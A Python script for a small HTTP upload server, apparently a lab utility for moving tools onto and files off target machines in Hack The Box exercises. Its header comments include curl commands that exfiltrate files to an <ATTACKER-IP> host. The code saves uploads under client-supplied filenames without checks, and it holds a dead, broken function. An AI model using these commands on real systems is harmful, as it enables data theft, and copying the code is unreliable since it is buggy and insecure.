#!/usr/env python3
########################################################################
#
#  Simple HTTP server that  supports file upload  for moving data around
#  between boxen on HTB. Based on a gist by bones7456, but mangled by me 
#  as I've tried  (badly) to port it to Python 3, code golf it, and make
#  It a  little more  robust. I was also able to  strip out a lot of the 
#  code trivially  because Python3 SimpleHTTPServer is  a thing, and the
#  cgi module handles multipart data nicely.
#
#  Lifted from: https://gist.github.com/UniIsland/3346170
#
#  Important to note that this tool is quick and dirty and is a good way
#  to get yourself  popped if you're leaving it  running out in the real
#  world. 
#
#  Run it on your attack box from the folder that contains your tools.
#
#  From the target machine:
#  Infil file: curl -O http://<ATTACKER-IP>:44444/<FILENAME>
#  Exfil file: curl -F 'file=@<FILENAME>' http://<ATTACKER-IP>:44444/
# 
#  Multiple file upload supported, just add more -F 'file=@<FILENAME>'
#  parameters to the command line.
#
########################################################################
import http.server
import socketserver
from urllib.parse import urlparse
import io
import cgi

# Change this to serve on a different port
PORT = 44444

class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):

    def do_POST(self):

        r, info = self.deal_post_data()
        print(r, info, "by: ", self.client_address)
        f = io.BytesIO()
        if r:
            f.write(b"Success\n")
        else:
            f.write(b"Failed\n")
        length = f.tell()
        f.seek(0)
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.send_header("Content-Length", str(length))
        self.end_headers()
        if f:
            self.copyfile(f, self.wfile)
            f.close()      

    def show_post_data(self):
        content_length = int(self.headers['Content-Length'])
        file_content = self.rfile.read(content_length)
        ctype, pdict = cgi.parse_header(self.headers['Content-Type'])
        pdict['boundary'] = bytes(pdict['boundary'], "utf-8")
        pdict['CONTENT-LENGTH'] = int(self.headers['Content-Length'])
        with open(filename, 'wb') as f:
            f.write(file_content)
        # Respond with 200 OK
        self.send_response(200)
    def deal_post_data(self):
        ctype, pdict = cgi.parse_header(self.headers['Content-Type'])
        pdict['boundary'] = bytes(pdict['boundary'], "utf-8")
        pdict['CONTENT-LENGTH'] = int(self.headers['Content-Length'])
        if ctype == 'multipart/form-data':
            form = cgi.FieldStorage( fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD':'POST', 'CONTENT_TYPE':self.headers['Content-Type'], })
            upload_file_minidump = form['upload_file_minidump'].value
            actual_filename = form['upload_file_minidump'].filename
            print("form\n:",form )
            # print("upload_file_minidump:",upload_file_minidump )
            try:

                filename = "./crash/%s"%actual_filename
                print("output filename: ", filename)
                with open(filename, 'wb') as f:
                    f.write(upload_file_minidump)
                self.send_response(200)
                # if isinstance(form["file"], list):
                #     for record in form["file"]:
                #         open("./%s"%record.filename, "wb").write(record.file.read())
                # else:
                #     filename = "./crash/%s"%actual_filename
                #     print("output filename: ", filename)
                #     with open(filename, 'wb') as f:
                #         f.write(upload_file_minidump)
                #     self.send_response(200)


            except IOError:
                    return (False, "Can't create file to write, do you have permission to write?")
        return (True, "Files uploaded")

Handler = CustomHTTPRequestHandler
with socketserver.TCPServer(("", PORT), Handler,False) as httpd:
    httpd.allow_reuse_address = True
    httpd.server_bind()
    httpd.server_activate()
    print("serving at port", PORT)
    try:
        httpd.serve_forever()
    except:
        print("close at port", PORT)
